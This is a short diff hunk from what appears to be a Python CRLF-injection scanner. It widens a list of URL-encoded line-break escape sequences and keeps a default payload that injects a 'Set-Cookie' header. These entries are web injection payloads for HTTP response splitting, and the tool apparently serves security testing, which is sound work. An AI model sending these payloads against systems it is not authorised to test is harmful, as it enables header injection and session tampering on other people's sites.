@@ -28,7 +28,7 @@ APPEND_LIST = ["", "crlf", "?crlf=", "#","__session_start__/"]
 
 # List of escape sequences that possibly result in crlf.
 # ESCAPE_LIST = ['%0d','%0a', '%0d%0a', '%23%0d', '%23%0a', '%23%0d%0a']
-ESCAPE_LIST = ['%%0a', '%0D%0A%09', '%0a', '%0d', '%0d%0a', '%23%0a', '%23%0d', '%23%0d%0a', '%25%30', '%25%30%61', '%250', '%250a', '%25250', '%2F..%0d%0a', '%2e%2e%2f%0d%0a', '%2f%2e%2e%0d%0a', '%3F%0D', '%3f%0d', '%3f%0d%0a', '%u000a']
+ESCAPE_LIST = ['%%0a', '%0A', '%0D', '%0D%0A%09', '%0a', '%0d', '%0d%0a', '%23%0a', '%23%0d', '%23%0d%0a', '%25%30', '%25%30%61', '%250', '%250a', '%25250', '%2F..%0d%0a', '%2e%2e%2f%0d%0a', '%2f%2e%2e%0d%0a', '%3F%0A', '%3F%0D', '%3f%0d', '%3f%0d%0a', '%u000a', '?%0D']
 
 # By default, the scanner will try to inject a Set-Cookie statment.
 DEFAULT_INJ = "Set-Cookie:param=crlf;"
